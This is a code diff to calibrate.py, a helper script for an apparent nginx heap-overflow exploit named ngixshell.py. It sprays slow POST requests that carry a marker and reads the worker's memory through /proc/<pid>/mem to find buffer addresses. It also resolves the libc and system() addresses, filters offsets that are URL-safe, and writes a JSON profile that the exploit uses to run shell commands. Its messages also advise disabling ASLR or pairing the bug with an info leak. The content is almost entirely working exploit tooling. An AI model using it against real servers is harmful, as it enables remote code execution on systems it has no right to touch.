@@ -11,19 +11,21 @@ Requirements
 
 Usage
 -----
-  python3 calibrate.py <host> <port> <worker_pid>
+  sudo python3 calibrate.py <host> <port> <worker_pid> --json -o profile.json
 
 Output
 ------
-Prints the HEAP_BASE, LIBC_BASE, system() offset, and PREREAD_HEAP_OFFSETS
-in a format ready to paste into ngixshell.py's KNOWN_BUILDS dictionary.
+Writes a calibration profile (HEAP_BASE, LIBC_BASE, system(), URL-safe spray
+offsets) consumed by ngixshell.py:
+
+  python3 ngixshell.py <host> --cmd 'id' --build-file profile.json
 
 Example
 -------
-  python3 calibrate.py 127.0.0.1 19321 12345
+  sudo python3 calibrate.py 127.0.0.1 19321 12345 --json -o profile.json
 """
 
-import socket, struct, time, sys, os, re, subprocess
+import argparse, json, platform, socket, time, sys, os, re, subprocess
 
 # ─── NGX_ESCAPE_ARGS safe-byte filter ─────────────────────────────────────────
 _T = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
@@ -45,38 +47,57 @@ def read_heap_ranges(pid: int):
     return ranges
 
 
-def heap_snapshot(pid: int) -> dict:
-    snap = {}
+# Unique marker placed at the start of the spray body: the body buffer address
+# is what the overflow must target, so we locate exactly that allocation.
+MARKER = b"NGIXCALIBRATION-SENTINEL-"
+
+
+def find_markers(pid: int, marker: bytes = MARKER) -> list:
+    """Return every heap address where `marker` currently lives."""
+    addrs = []
     for start, end in read_heap_ranges(pid):
-        with open(f"/proc/{pid}/mem", "rb") as mem:
-            mem.seek(start)
-            snap[start] = mem.read(end - start)
-    return snap
-
-
-def diff_snapshots(before: dict, after: dict) -> list:
-    diffs = []
-    for base, new in after.items():
-        old = before.get(base, b"")
-        size = min(len(old), len(new))
-        for i in range(0, size - 16, 8):
-            if old[i:i+16] == b"\x00"*16 and any(b != 0 for b in new[i:i+16]):
-                diffs.append(base + i)
-    return diffs
+        try:
+            with open(f"/proc/{pid}/mem", "rb") as mem:
+                mem.seek(start)
+                data = mem.read(end - start)
+        except (OSError, OverflowError):
+            continue
+        pos = 0
+        while True:
+            idx = data.find(marker, pos)
+            if idx == -1:
+                break
+            addrs.append(start + idx)
+            pos = idx + 1
+    return addrs
 
 
 def open_slow_post(host: str, port: int, body_len: int = 4096,
-                   proxy_path: str = "/upload") -> socket.socket:
-    """Open a POST that claims 4× the body length to keep nginx waiting."""
+                   proxy_path: str = "/upload",
+                   spray_mode: str = "partial") -> socket.socket:
+    """Open a POST holding the body buffer alive.
+
+    partial: claim 4× the body length, send less       (bundled lab)
+    full:    send the complete body + X-Delay header   (DepthFirst lab)
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
-    body = b"X" * body_len
+    body = MARKER + b"X" * (body_len - len(MARKER))
+    if spray_mode == "full":
+        clen   = body_len
+        extra  = b"X-Delay: 60\r\n"
+        tail   = body
+    else:
+        clen   = body_len * 4
+        extra  = b""
+        tail   = body
     s.sendall(
         b"POST " + proxy_path.encode() + b" HTTP/1.1\r\n"
         b"Host: " + host.encode() + b"\r\n"
-        b"Content-Length: " + str(body_len * 4).encode() + b"\r\n"
+        b"Content-Length: " + str(clen).encode() + b"\r\n"
+        + extra +
         b"Connection: keep-alive\r\n"
-        b"\r\n" + body
+        b"\r\n" + tail
     )
     return s
 
@@ -99,11 +120,11 @@ def find_system(pid: int):
                         if " system" in l and ("FUNC" in l or "func" in l):
                             m = re.search(r"^\s+\d+:\s+([0-9a-f]+)\s", l)
                             if m:
+                                # st_value is the offset from the ELF load base;
+                                # the mapping in /proc/<pid>/maps starts at
+                                # (base + segment file offset).
                                 raw_offset = int(m.group(1), 16)
-                                # readelf shows offset from file start; subtract
-                                # the file offset of this segment to get VA offset
-                                file_off = int(parts[2], 16)
-                                sys_va_off = raw_offset  # for position-relative libs
+                                file_off   = int(parts[2], 16)
                                 return libc_base - file_off, raw_offset
                 except Exception:
                     pass
@@ -111,13 +132,36 @@ def find_system(pid: int):
 
 
 def main():
-    if len(sys.argv) < 4:
-        print(__doc__)
-        sys.exit(1)
+    ap = argparse.ArgumentParser(
+        description="Compute HEAP_BASE / libc / pool offsets for a target nginx worker.",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="Example:\n  python3 calibrate.py 127.0.0.1 19321 12345 --json -o profile.json",
+    )
+    ap.add_argument("host")
+    ap.add_argument("port", type=int)
+    ap.add_argument("worker_pid", type=int)
+    ap.add_argument("--json", action="store_true",
+                    help="print a machine-readable profile (for ngixshell.py --build-file)")
+    ap.add_argument("-o", "--output", metavar="FILE",
+                    help="write the JSON profile to FILE")
+    ap.add_argument("--iterations", type=int, default=30, metavar="N",
+                    help="spray connections to sample (default: 30)")
+    ap.add_argument("--body-len", type=int, default=4096, metavar="N",
+                    help="spray body size in bytes (default: 4096; must match "
+                         "the exploit's --body-len)")
+    ap.add_argument("--max-offsets", type=int, default=64, metavar="N",
+                    help="cap the number of offsets written to the profile "
+                         "(default: 64)")
+    ap.add_argument("--spray-path", metavar="PATH", default="/upload",
+                    help="location used for the spray (default: /upload)")
+    ap.add_argument("--spray-mode", choices=["partial", "full"], default="partial",
+                    help="partial: short body + large Content-Length (bundled lab); "
+                         "full: complete body + X-Delay (DepthFirst lab)")
+    args = ap.parse_args()
 
-    HOST = sys.argv[1]
-    PORT = int(sys.argv[2])
-    PID  = int(sys.argv[3])
+    HOST = args.host
+    PORT = args.port
+    PID  = args.worker_pid
 
     heap_ranges = read_heap_ranges(PID)
     if not heap_ranges:
@@ -137,31 +181,64 @@ def main():
         print("[!] Could not locate system() — check libc path")
 
     print()
-    print("[*] Opening spray connections and tracking heap allocations ...")
+    print("[*] Opening spray connections and locating each body buffer ...")
 
-    safe_offsets = []
     conns = []
+    unsafe = 0
+    seen = set()
+    safe_offsets_ordered = []
+    found_this_round = 0
 
-    for n in range(30):
-        before = heap_snapshot(PID)
-        c = open_slow_post(HOST, PORT)
-        time.sleep(0.1)
-        after = heap_snapshot(PID)
-        conns.append(c)
-
-        new_addrs = diff_snapshots(before, after)
-        for addr in new_addrs:
-            off = addr - HEAP_BASE
-            if 0 < off < 0x300000:
+    for n in range(args.iterations):
+        c = open_slow_post(HOST, PORT, body_len=args.body_len,
+                           proxy_path=args.spray_path,
+                           spray_mode=args.spray_mode)
+        # the worker may need a moment to read and buffer the body
+        new_addrs = []
+        for _ in range(25):
+            new_addrs = [a for a in find_markers(PID) if a not in seen]
+            if new_addrs:
+                break
+            time.sleep(0.2)
+        if not new_addrs:
+            print(f"  conn {n+1:2d}: body buffer not found — increase --body-len?")
+        else:
+            found_this_round += 1
+            for addr in new_addrs:
+                seen.add(addr)
+                off  = addr - HEAP_BASE
                 safe = is_safe(addr)
-                print(f"  conn {n+1:2d}: heap+0x{off:06x} (0x{addr:012x}) "
-                      f"{'URL-SAFE' if safe else 'unsafe'}")
-                if safe and off not in safe_offsets:
-                    safe_offsets.append(off)
+                print(f"  conn {n+1:2d}: body buffer at heap+0x{off:06x} "
+                      f"({'URL-SAFE' if safe else 'unsafe'})")
+                if safe:
+                    if off not in safe_offsets_ordered:
+                        safe_offsets_ordered.append(off)
+                else:
+                    unsafe += 1
+        conns.append(c)
 
     for c in conns:
         try: c.close()
         except: pass
+
+    safe_offsets = safe_offsets_ordered
+    print(f"[*] {found_this_round}/{args.iterations} spray buffers located, "
+          f"{len(safe_offsets)} URL-safe ({unsafe} dropped by the escape filter)")
+    if len(safe_offsets) > args.max_offsets:
+        print(f"[*] capping profile to the first {args.max_offsets} offsets")
+        safe_offsets = safe_offsets[:args.max_offsets]
+
+    profile = {
+        "heap_base":   HEAP_BASE,
+        "libc_base":   libc_base,
+        "sys_offset":  sys_off,
+        "system_addr": (libc_base + sys_off) if (libc_base and sys_off) else None,
+        "offsets":     sorted(set(safe_offsets)),
+        "spray_count": args.iterations,
+        "spray_path":  args.spray_path,
+        "spray_mode":  args.spray_mode,
+        "arch":        platform.machine(),
+    }
 
     print()
     print("=" * 60)
@@ -172,25 +249,31 @@ def main():
         print(f"  LIBC_BASE  = 0x{libc_base:x}")
         print(f"  sys_offset = 0x{sys_off:x}")
     print()
-    print("  Paste into KNOWN_BUILDS in ngixshell.py:")
+    print("  Use with ngixshell.py:")
     print()
-    print('    "nginx/VERSION-variant": {')
-    print(f'        "heap_base":  0x{HEAP_BASE:x},')
-    if libc_base:
-        print(f'        "libc_base":  0x{libc_base:x},')
-        print(f'        "sys_offset": 0x{sys_off:x},')
-    print(f'        "offsets": {sorted(set(safe_offsets))},')
-    print('    },')
+    print("    python3 ngixshell.py <host> --cmd 'id' "
+          "--build-file profile.json")
+
+    if args.json or args.output:
+        print()
+        print(json.dumps(profile, indent=2))
+
+    if args.output:
+        with open(args.output, "w", encoding="utf-8") as f:
+            json.dump(profile, f, indent=2)
+        print(f"[*] Profile written to {args.output}")
 
     if not safe_offsets:
         print()
-        print("  [!] No URL-safe offsets found.")
-        print("      This HEAP_BASE produces no safe candidate addresses.")
-        print("      The exploit cannot directly target this nginx binary.")
-        print("      Possible solutions:")
-        print("        • Find a different nginx build with a lower HEAP_BASE")
-        print("        • Use --heap-base to try a different base address")
-        print("        • Pair with an info-leak vulnerability for ASLR bypass")
+        print("  [!] No URL-safe offsets found — the exploit cannot encode this")
+        print("      heap address in the URI (nginx NGX_ESCAPE_ARGS filter).")
+        if platform.machine() != "x86_64":
+            print(f"      Architecture is {platform.machine()}: the current exploit is")
+            print("      x86_64-only (arm64 heap addresses like 0xaaaa... always contain")
+            print("      non-URL-safe bytes). Use an x86_64 target with ASLR disabled.")
+        else:
+            print("      Try a different build (lower HEAP_BASE) or pair the bug with")
+            print("      an info leak for ASLR bypass.")
 
 
 if __name__ == "__main__":
